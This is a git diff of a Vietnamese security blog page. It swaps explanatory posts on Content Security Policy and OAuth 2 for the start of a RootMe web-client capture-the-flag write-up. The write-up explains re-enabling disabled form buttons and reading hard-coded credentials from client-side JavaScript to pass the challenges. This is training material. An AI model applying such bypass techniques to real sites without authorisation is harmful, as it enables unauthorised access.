@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-csp" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CTF /RootMe/WEB-CLIENT" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/06/14/csp/" class="article-date">
-  <time datetime="2020-06-15T02:01:03.969Z" itemprop="datePublished">2020-06-14</time>
+    <a href="/2020/06/15/CTF%20/RootMe/WEB-CLIENT/" class="article-date">
+  <time datetime="2020-06-15T15:34:52.156Z" itemprop="datePublished">2020-06-15</time>
 </a>
     
   </div>
@@ -78,231 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/14/csp/">csp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- wp:heading -->
-<h2><strong>Content&nbsp;Security&nbsp;Policy&nbsp;(CSP)&nbsp;là&nbsp;gì&nbsp;?</strong>&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng.CSP là biện pháp đối phó rất hiệu quả với các cuộc tấn công Cross Site Scripting (XSS) và các kiểu injection tương tự.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image -->
-<figure class="wp-block-image"><img src="https://datahouse.asia/wp-content/uploads/2020/04/content-security-policy-1024x414.png" alt="Does Security Matter to Front End Developers and Tips To Not Get ..."/></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Tưởng tượng một chút, chúng ta ó 2 hướng cho các cuộc tấn công chèn script độc hại vào các website, đó là thông qua:</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:list -->
-<ul><li>Inline Script: attacker đặt script của chúng trực tiếp vào trang web của bạn</li><li>Trình duyệt sẽ Load script từ các domain khác (của attacker) trên website đang truy cập .</li></ul>
-<!-- /wp:list -->
-
-<!-- wp:paragraph -->
-<p>Với hướng thứ 2,  attacker ưa dùng hơn vì dễ dàng truền tải script độc hại và có thể tùy ý thay đổi nội dung của script mà trình duyệt load. Nó có thể thay đổi trang web mà không cần tương tác.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image {"id":316,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-5.png" alt="" class="wp-image-316"/></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Nhiệm vụ của CSP lúc này là không cho phép trình duyệt load script từ domain khác ,như thế kế hoạch của attacker sẽ bị hỏng. Vậy CSP đã làm thế nào ? </p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading -->
-<h2><strong>Cách&nbsp;hoạt&nbsp;động&nbsp;của&nbsp;SCP</strong>&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>Bằng cách sử dụng các chỉ thị của CSP phù hợp ở trong các tiêu đề phản hồi HTTP, bạn có thể chọn lọc, chỉ định nguồn dữ liệu nào sẽ được phép sử dụng trong ứng dụng web của mình. Ví dụ như:</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:list -->
-<ul><li>Chỉ định thực thi script đến từ domain của mình (ví dụ: mydomain.com)</li><li>Chỉ định thực thi các script đến từ một domain khác đáng tin cậy hay subdomain (ví dụ: * .mydomain.com, google.com)</li><li>Chỉ định chỉ thực thi tệp duy nhất mydomain.com/script.min.js</li><li>Không thực thi bất kì mã JavaScript nào</li><li>Chỉ hiển thị hình ảnh đến từ cdn.securecdn.com</li></ul>
-<!-- /wp:list -->
-
-<!-- wp:paragraph -->
-<p>Cách chỉ định chính sách , đó là thêm header HTTP dưới đây vào repsonse , nó có dạng là</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Content-Security-Policy: [chinh sách]</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image {"id":311,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-2.png" alt="" class="wp-image-311"/></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Để&nbsp;viết&nbsp;chính&nbsp;sách,&nbsp;bạn&nbsp;cần&nbsp;biết&nbsp;các&nbsp;chỉ&nbsp;thị&nbsp;cho&nbsp;các&nbsp;đối&nbsp;tượng&nbsp;&nbsp;</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image {"id":312,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-3.png" alt="" class="wp-image-312"/></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Ví dụ như img-src áp dụng các hình ảnh được hiển thị trên trang web, nó sẽ chỉ định nguồn hình ảnh đươc phép lấy về, default-src đóng vai trò dự phòng để tìm nạp CSP khác nếu nó bị thiếu . Để biết thêm và chi tiết các chỉ thị các bạn có thể tham khảo nội <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">ở đây</a>  .</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Cùng với các chị thị còn có các thuộc tính của các chỉ thị hoặc có thể gọi là các keywords/values bổ trợ, Ví dụ như :</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:list -->
-<ul><li>"none" không cho phép các đối tượng liên quan đến chỉ thị được thực thi.</li><li>"self " cho phép thực thi đối với domain của bạn (ko tính subdomain) hoặc những domain được chỉ định.</li><li>"unsafe-inline" cho phép thực thi các đoạn mã CSS hoặc Javascript được nhúng trực tiếp vào mã nguồn. Thiết lập này không được khuyến khích sử dụng nhưng trong nhiều trường hợp chúng ta vẫn phải dùng đến.</li><li>"unsafe-eval" cho phép chạy hàm eval(), đây là một hàm khá nguy hiểm của Javascript.</li><li>"*" áp dụng cho tất cả ví dụ như 'Https: // *' sẽ cho phép tất cả các tài nguyên đang truyền tải qua HTTPS.</li></ul>
-<!-- /wp:list -->
-
-<!-- wp:paragraph -->
-<p>Bạn&nbsp;có&nbsp;thể&nbsp;tham&nbsp;khảo&nbsp;thêm&nbsp;<a rel="noreferrer noopener" href="https://content-security-policy.com/" target="_blank">ở đây</a>&nbsp;</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading {"level":3} -->
-<h3><strong>VÍ DỤ MỘT VÀI CHÍNH SÁCH</strong></h3>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>&nbsp;CSP chỉ cho phép JavaScript , cái mà được lưu trữ trong trang web của bạn</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>Content-Security-Policy: script-src 'self'</code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Cho phép các các nội dung thuộc domain và subdomain của example.com và được truyền tải thông qua cả 2 giao thức http , https</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>Content-Security-Policy: default-src *://*.example.com  </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Chỉ cho phép JavaScript , cái mà được lưu trữ trên trang web của bạn và cdn.trustyorigin.net nhưng hình ảnh thì ở bất kì chỗ nào</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>Content-Security-Policy: script-src 'self' cdn.trustedorigin.net; img-src *; </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Chặn tất cả các form submit</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>Content-Security-Policy form-action 'none'; </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Chỉ cho phép thực thi js trong tập tin script.js trên https://trustyorigin.net/ và mặc định các giá trị của child-src, connect-src, font-src, frame-src, img-src, manifest-src, media-src, media-src, object-src, script-src, style-src và worker-src đều là self - các nội dung liên quan đến chỉ thị đều lấy từ nguồn của URL hiện tại</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>Content-Security-Policy default-src ‘self’; script-src https://trustedorigin.net/script.js; </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:heading -->
-<h2><strong>Triển&nbsp;khai&nbsp;CSP</strong>&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>Để triển khai CSP, ta cần định cấu hình máy chủ web của mình để trả về Content-Security-Policy header HTTP (đôi khi bạn sẽ thấy nó với header X-Content-Security-Policytiêu đề, nhưng đó là phiên bản cũ hơn và bây giờ không cần đề cập đến nó nữa). Ví dụ: nếu bạn sử dụng Apache, bạn có thể xác định CSP trong tệp httpd.conf , Virtualhost hoặc .htaccess của trang web của bạn.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image {"id":313,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-4.png" alt="" class="wp-image-313"/></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Ngày nay ,CSP cũng được hỗ trợ bởi tất cả các trình duyệt hiện đại  và đã được nhiều năm chỉ riêng không được hỗ trợ trong Internet Explorer, nó chỉ dùng sandbox.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:image {"id":319,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-6.png" alt="" class="wp-image-319"/><figcaption>Level ở đây các bạn có thể hiểu như là thế hệ của CSP</figcaption></figure>
-<!-- /wp:image -->
-
-<!-- wp:paragraph -->
-<p>Ngoài ra cấu hình trên server, bạn cũng có thể cung cấp các chỉ thị cụ thể bằng cách sử dụng thẻ &lt;meta&gt;- thẻ HTML , được gọi là CSP Page-level. Dưới đây, một ví dụ đặt ra chính sách tương tự như trên:</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self' "> </code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Để sử dụng các chỉ thị này sẽ cần đến Sanboxing của trình duyệt</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Một vấn đề nữa, nếu như các trình duyệt không hỗ trợ CSP nó vẫn hoạt động với các máy chủ triển khai nó và ngược lại, các trình duyệt không hỗ trợ CSP chỉ cần bỏ qua nó, hoạt động như bình thường, và mặc định Same-origin là policy cho nội dung web. Nếu trang web không cung cấp CSP header , các trình duyệt cũng sử dụng Same-origin làm policy .</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading -->
-<h2>Bypass CSP</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>Có lẽ đây là mục mà ae pentest yêu thích nhất, bất kì phương thức bảo mật nào đều có lỗ hổng và CSP cũng không ngoại lệ. CSP giống như whitelist, vì vậy đôi lúc nó sẽ khổng thể đáp ứng được toàn bộ ưu cầu về các tính bảo mật. Các bạn có thểm tham khảo các bài viết dưới đây :</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:list -->
-<ul><li><a href="http://blog.innerht.ml/csp-2015/" target="_blank" rel="noopener">"CSP 2015". XSS&nbsp;Jigsaw.&nbsp;Retrieved&nbsp;December&nbsp;12, 2015.&nbsp;</a></li><li><a href="http://sebastian-lekies.de/csp/bypasses.php" target="_blank" rel="noopener">Lekies,&nbsp;Sebastian. "Collection&nbsp;of&nbsp;CSP&nbsp;bypasses".&nbsp;Retrieved&nbsp;2017-06-05.&nbsp;</a></li><li><a href="http://www.slideshare.net/x00mario/an-abusive-relationship-with-angularjs" target="_blank" rel="noopener">"An&nbsp;Abusive&nbsp;Relationship&nbsp;with&nbsp;AngularJS".&nbsp;Retrieved&nbsp;January&nbsp;5, 2016.&nbsp;</a></li><li><a href="https://www.youtube.com/watch?v=p07acPBi-qw" target="_blank" rel="noopener">OWASP (2017-05-25),&nbsp;AppSec&nbsp;EU 2017&nbsp;Don't&nbsp;Trust&nbsp;The DOM:&nbsp;Bypassing&nbsp;XSS&nbsp;Mitigations&nbsp;Via&nbsp;Script&nbsp;Gadgets&nbsp;by&nbsp;Sebastian&nbsp;Lekies,&nbsp;retrieved&nbsp;2017-06-05&nbsp;</a></li><li><a rel="noreferrer noopener" href="https://portswigger.net/research/bypassing-csp-with-policy-injection" target="_blank">https://portswigger.net/research/bypassing-csp-with-policy-injection</a>&nbsp;</li><li><a rel="noreferrer noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/" target="_blank">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a>&nbsp;</li><li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li></ul>
-<!-- /wp:list -->
-
-<!-- wp:paragraph -->
-<p>Ngay từ đầu mk cũng đề cập , CSP giúp giảm thiểu các cuộc tấn công xss và các kiểu tấn công tương tự nhưng nó lại không có tác dụng một người ae họ hàng gần với nó là HTML injection.  Bạn có thể tham khảo chi tiết <a rel="noreferrer noopener" href="https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/" target="_blank">ở đây</a>  và xem bài thuyết trình về CSP (Tóm tắt một chút cho các bạn đó là anh Matt Brunt đã trình bày các khái niệm, mối đe dọa từ xss, triển khai CSP một cách hợp lí để vừa ngăn ngừa tấn công vừa tránh bị phá hỏng web site bởi chính CSP, và cuối cùng đó là các vấn đề và sự hữu ích của tính  năng auto report của CSP - "report-only" cho các quản trị). OK cùng xem nào ! và hẹn các bạn ở bài viết sau.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=mr230uotw-Y","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
-<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
-https://www.youtube.com/watch?v=mr230uotw-Y
-</div></figure>
-<!-- /wp:core-embed/youtube -->
-
-<!-- wp:heading -->
-<h2>Tham khảo</h2>
-<!-- /wp:heading -->
-
-<!-- wp:list -->
-<ul><li><a href="https://en.wikipedia.org/wiki/Content_Security_Policy" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Content_Security_Policy</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li><li><a href="https://w3c.github.io/webappsec-csp/#framework" target="_blank" rel="noopener">https://w3c.github.io/webappsec-csp/#framework</a><a href="https://www.netsparker.com/blog/web-security/content-security-policy/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/content-security-policy/</a></li><li><a href="https://blog.sucuri.net/2018/04/content-security-policy.html" target="_blank" rel="noopener">https://blog.sucuri.net/2018/04/content-security-policy.html</a></li><li><a href="https://content-security-policy.com/" target="_blank" rel="noopener">https://content-security-policy.com/</a></li></ul>
-<!-- /wp:list -->
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/06/14/csp/" data-id="ckbfuqz8m0000xljm76ar1ype" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-oath" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/06/14/oath/" class="article-date">
-  <time datetime="2020-06-15T01:20:34.000Z" itemprop="datePublished">2020-06-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/14/oath/">Oauth</a>
+      <a class="article-title" href="/2020/06/15/CTF%20/RootMe/WEB-CLIENT/">CTF /RootMe/WEB-CLIENT</a>
     </h1>
   
 
@@ -311,300 +87,2081 @@ https://www.youtube.com/watch?v=mr230uotw-Y
     <div class="article-entry" itemprop="articleBody">
       
         <!-- wp:image -->
-<figure class="wp-block-image"><img src="https://img.codehub.vn/post/1577243102_c5b006c20d8069e8e61f3291be2f43b8.jpeg" alt="OpenID và OAuth Khác Nhau Như Thế Nào"/><figcaption>Ảnh từ codehub.vn</figcaption></figure>
+<figure class="wp-block-image"><img src="https://miro.medium.com/max/1424/1*joz9hfPQ-osvbLiUqfakmg.png" alt=""/><figcaption><br><strong>Write-Up</strong></figcaption></figure>
+<!-- /wp:image -->
+
+<!-- wp:heading -->
+<h2>HTML – disabled buttons</h2>
+<!-- /wp:heading -->
+
+<!-- wp:heading {"level":4} -->
+<h4><strong>Resolution</strong></h4>
+<!-- /wp:heading -->
+
+<!-- wp:paragraph -->
+<p>Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled . </p>
+<!-- /wp:paragraph -->
+
+<!-- wp:image {"id":8,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1024x283.png" alt="" class="wp-image-8"/><figcaption>Tag input bị disable bằng thuộc tính "disabled"</figcaption></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>Xin chào các bạn mình đã quay trở lại với ... bài viết dài , thôi vào nội dung luôn .</p>
+<p>Xóa thuộc tính "disabled" xong là có thể sử dụng được, từ đó submit bất cứ cái gì là sẽ có pass.</p>
 <!-- /wp:paragraph -->
 
-<!-- wp:heading -->
-<h2>Khái&nbsp;niệm&nbsp;&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p><strong>OAuth</strong> (Open Authorization) là một phương thức ủy quyền để cung cấp khả năng truy cập các tài nguyên qua giao thức HTTP . OAuth cho phép các trang web hoặc ứng dụng (Customer) truy cập tài nguyên được bảo vệ từ dịch vụ web (Service Provider) thông qua API mà không yêu cầu người dùng tiết lộ thông tin đăng nhập được cấp bởi nhà cung cấp dịch vụ cho bên thứ ba. Nó hoạt động như một trung gian thay mặt cho người dùng cuối, cấp quyền sử dụng thông tin của tài khoản được chia sẻ cho dịch vụ của bên thứ ba với access token.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading -->
-<h2>Lịch&nbsp;sử&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>OAuth được phát hành lần đầu tiên vào năm 2007 là phương thức ủy quyền sử dụng cho Twitter application program interface (API) với tên gọi là OpenID . Năm 2010, OAuth 1.0 Revision được xuất bản đê giải quyết về vấn đề session fixation tồn tại. Năm 2012, Nhóm làm việc OAuth của IETF đã xuất bản bản thảo đầu tiên của giao thức OAuth 2.0. Giống như OAuth ban đầu, OAuth 2.0 cung cấp cho người dùng khả năng cấp quyền truy cập ứng dụng của bên thứ ba vào tài nguyên web mà không cần chia sẻ mật khẩu. Tuy nhiên, đây là một giao thức hoàn toàn mới và không tương thích ngược với OAuth 1.0. Các tính năng được cập nhật bao gồm uồng cấp mã ủy quyền mới để áp dụng cho các ứng dụng di động, chữ ký được đơn giản hóa và token tồn tại trong thời gian ngắn với các ủy quyền tồn tại lâu dài. Và hiện tại OAuth đãng triển khai , phát triển phiên bản OAuth 2.1.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Trong bài viết này mình sẽ chỉ trình bày các thứ liên quan đến phiên bản OAuth2 bởi một phần OAuth 2 đã được sử dụng phổ biến hơn và  nếu mk trình bày cả OAuth1 nữa rất là dài. cực kì nhiều thứ nên các bạn có thể tham khảo bên ngoài hoặc đợi một ngày nào đó mình sẽ viết về nó.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading -->
-<h2>Các&nbsp;thuật&nbsp;ngữ&nbsp;sử&nbsp;dụng&nbsp;&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p><strong>Resource owner</strong> (User) Một thực thể có khả năng cấp quyền truy cập vào một tài nguyên được bảo vệ. Khi chủ sở hữu tài nguyên là một người , nó được gọi là một người dùng cuối.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p><strong>Client</strong> (Application) Một ứng dụng thực hiện các yêu cầu đến tài nguyên được bảo vệ thay mặt cho chủ sở hữu tài nguyên và với sự ủy quyền của nó . Hiểu một cách đơn giản hơn là những ứng dụng mong muốn truy cập vào dữ liệu người dùng.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p><strong>Authorization server</strong> (API) Máy chủ cấp phát access token cho client sau khi xác thực thành công với chủ sở hữu tài nguyên và có được ủy quyền.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p><strong>Resource Server</strong> (API) Máy chủ lưu trữ các tài nguyên được bảo vệ, có quyền chấp nhận và phản hồi các requests có chứa access token đến tài nguyên được bảo vệ, hay chính là xác thực ủy quyền</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:paragraph -->
-<p>Resource Server và Authorization Server là một điểm khác biệt giữa OAuth2 và OAuth1 khi tách biệt hai thao tác: cấp mã ủy quyền (access token) và xác thực ủy quyền (Authentication) thành 2 Server còn OAuth1 thực hiện trên cùng một server gọi là <strong>Sevice Provider</strong>.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:heading -->
-<h2>OAuth&nbsp;hoạt&nbsp;động&nbsp;như&nbsp;thế&nbsp;nào&nbsp;?&nbsp;</h2>
-<!-- /wp:heading -->
-
-<!-- wp:image {"id":345,"sizeSlug":"large"} -->
-<figure class="wp-block-image size-large"><img src="https://hydrasky.ml/wp-content/uploads/2020/06/image.png" alt="" class="wp-image-345"/><figcaption>Ảnh từ Viblo.asia</figcaption></figure>
+<!-- wp:image {"id":9,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png" alt="" class="wp-image-9"/><figcaption>Pass nhận được (Xin giấu pass )</figcaption></figure>
 <!-- /wp:image -->
 
-<!-- wp:list {"ordered":true} -->
-<ol><li>Client sẽ yêu cầu ủy quyền truy cập các Protected Resource từ Resource owner (User). Cient có thể trực tiếp thực hiện yêu cầu ủy quyền tới Resource owner hoặc thông qua Authorization server enpoint để User cho phép truy cập.</li><li>User sẽ xác thực và ủy quyền truy cập tới Resource cho client , lúc này Ứng dụng sẽ nhận được Cấp phép (Authorization Grant) . Sẽ có 4 kiểu cấp quyền nên việc cấp như thế nào client sẽ phụ thuộc vào loại ứng dụng dùng để truy cập vào tài nguyên. Đây được coi như là chứng chỉ đại diện cho sự ủy quyền của Resource Owner.</li><li>Ứng dụng client yêu cầu access token từ Authorization Server bằng cách chuyển Authorization Grant cùng với các thông tin khác để xác thực, chẳng hạn như <strong>client ID</strong>, <strong>client secret</strong>, and <strong>grant_type</strong>.</li><li>Khi xác thực thành công, Authorization Server sẽ phát hành <strong>Access Token</strong> và <strong>Refresh Token</strong> cho ứng dụng client.</li><li>Ứng dụng yêu cầu quyền truy cập vào Protected Resource từ Resource Server và xác thực bằng cách đưa ra Access Token .</li><li>Khi xác thực thành công yêu cầu của máy khách, Resource Server sẽ trả về tài nguyên được yêu cầu.</li></ol>
-<!-- /wp:list -->
-
-<!-- wp:paragraph -->
-<p>Mục đích <strong>Refresh token</strong> ở đây là dùng để xác thực với Authorization Server thay vì nhờ User như trên để lấy Access token mới khi Access token cũ đã bị hết hạn. Lưu ý là không phải  <strong>Grant Types</strong> nào cũng hỗ trợ refresh_token và việc có nhận, sử dụng nó là không bắt buộc, là tùy chọn của bạn.</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>grant_type=refresh_token&amp;refresh_token=tGzv3JOkF0XG5Qx2TlKWIA</code></pre>
-<!-- /wp:code -->
-
 <!-- wp:heading -->
-<h2><strong>Authorization&nbsp;grant&nbsp;types</strong>&nbsp;</h2>
+<h2><code><strong>Javascript - Authentication</strong></code></h2>
 <!-- /wp:heading -->
-
-<!-- wp:paragraph -->
-<p>OAuth 2.0 Authorization Framework đã đưa ra 4 luồng để lấy Access Token, các luồng này được gọi là "<strong>Grant types</strong>" .</p>
-<!-- /wp:paragraph -->
 
 <!-- wp:heading {"level":3} -->
-<h3>Authorization&nbsp;Code&nbsp;Flow</h3>
+<h3><strong>Resolution</strong></h3>
 <!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p>Đây là một hình thức ủy quyền được dùng phổ biến nhất hiện nay, thường được sử dụng bởi các ứng dụng web triển khai trên máy chủ và nó có thể cung cấp cả Access Token và Refresh Token. Authentization Code thuộc kiểu <strong>redirection-based flow</strong> nên Client có thể tương tác với resource owner và có khả năng nhận các yêu cầu đến từ Authorization Server .</p>
+<p>View page source ta sẽ thấy việc xử lí đăng nhập sẽ qua file "login.js" </p>
 <!-- /wp:paragraph -->
 
-<!-- wp:heading {"level":4} -->
-<h4>Flow</h4>
-<!-- /wp:heading -->
-
-<!-- wp:image -->
-<figure class="wp-block-image"><img src="https://i2.wp.com/blogs.innovationm.com/wp-content/uploads/2019/07/blog-open1.png?resize=625%2C348" alt="Oauth2 authorization code flow "/></figure>
+<!-- wp:image {"id":13,"width":1015,"height":91,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-2-1024x92.png" alt="" class="wp-image-13" width="1015" height="91"/><figcaption>File login.js</figcaption></figure>
 <!-- /wp:image -->
 
 <!-- wp:paragraph -->
-<p>Đầu tiên, chọn đăng nhập thông qua một bên thứ 3 nào đấy , ví dụ trong hình "Login in with Google"</p>
+<p>Check file ta thấy luôn được user và password để đăng nhập. Và pass cx để bypass challenge</p>
 <!-- /wp:paragraph -->
 
-<!-- wp:paragraph -->
-<p>Ứng dụng (Client)  sẽ chuyển hướng người dùng đến Authorization Server (/authorize endpoint) .</p>
-<!-- /wp:paragraph -->
+<!-- wp:image {"id":14,"width":797,"height":205,"sizeSlug":"large"} -->
+<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-3-1024x264.png" alt="" class="wp-image-14" width="797" height="205"/><figcaption>File login.js</figcaption></figure>
+<!-- /wp:image -->
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code>https:&#47;&#47;accounts.google.com/oauth/authorize?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=yelp.com/callback&amp;scope=profile_contact 
-Trong đó : 
-- response_type là tham số  chỉ định ứng dụng đang yêu cầu nhận authorization_code 
-- client_id là ID của ứng dụng đăng kí với service bên thứ 3 đó, Authorization Server sẽ biết khách hàng của ứng dụng nào đang yêu cầu xin ủy quyền.
-- redirect_uri là nơi sẽ truyển hướng về khi nhận code
-- scope : là phạm vi quyền truy cập</code></pre>
-<!-- /wp:code -->
+<!-- wp:heading -->
+<h2>Javascript - Source</h2>
+<!-- /wp:heading -->
 
-<!-- wp:paragraph -->
-<p>Authorization Server sẽ chuyến hướng User đến mục đăng nhập nếu như bạn chưa đăng nhập và lời nhắc có cho chép ủy quyền hay không? </p>
-<!-- /wp:paragraph -->
+<!-- wp:heading {"level":3} -->
+<h3>Resolution</h3>
+<!-- /wp:heading -->
 
 <!-- wp:paragraph -->
-<p>Sau khi User cho phép , Authorization Server sẽ tiếp tục chuyến hướng người dùng quay trở lại ứng dụng  (Client) với Authorization <strong>CODE</strong> .( Các bước sau không còn cần tác nhân User)</p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>https:&#47;&#47;yelp.com/callback?code=AUTHORIZATION_CODE</code></pre>
-<!-- /wp:code -->
-
-<!-- wp:paragraph -->
-<p>Sau khi nhận được, Client sẽ thực hiện một request POST gửi Authorization <strong>CODE</strong> đó đến Authorization Server (/oauth/token endpoint) cùng với lại các tham số CLIENT ID và CLIENT SECRET của ứng dụng để Server xác thực . </p>
-<!-- /wp:paragraph -->
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code>https:&#47;&#47;accounts.goole.com/oauth/token?client_id=CLIENT_ID&amp;client_secret=CLIENT_SECRET&amp;grant_type=authorization_code&amp;code=AUTHORIZATION_CODE&amp;redirect_uri=CALLBACK_URL
-Trong đó : 
-CLIENT SECRET ở đây là một giá trị bí mật chỉ cho phép APP và Authorization Server biết.</code></pre>
-<!-- /wp:code -->
-
-<!-- wp:group -->
-<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
-<p>Phía Authorization Server sẽ thực hiện xác thức các giá trị được gửi.</p>
-<!-- /wp:paragraph --></div></div>
-<!-- /wp:group -->
-
-<!-- wp:group -->
-<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:group -->
-<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
-<p>Nếu như thành công , Authorization Server trả về &nbsp;ID Token và Access Token ( Refresh Token).</p>
-<!-- /wp:paragraph --></div></div>
-<!-- /wp:group --></div></div>
-<!-- /wp:group -->
-
-<!-- wp:group -->
-<div class="wp-block-group"><div class="wp-block-group__inner-container"><!-- wp:paragraph -->
-<p>Bây giờ ứng dụng  có thể sử dụng Access Token để truy cập thông tin  của người dùng User thông qua API.</p>
-<!-- /wp:paragraph --></div></div>
-<!-- /wp:group -->
-
-<!-- wp:paragraph -->
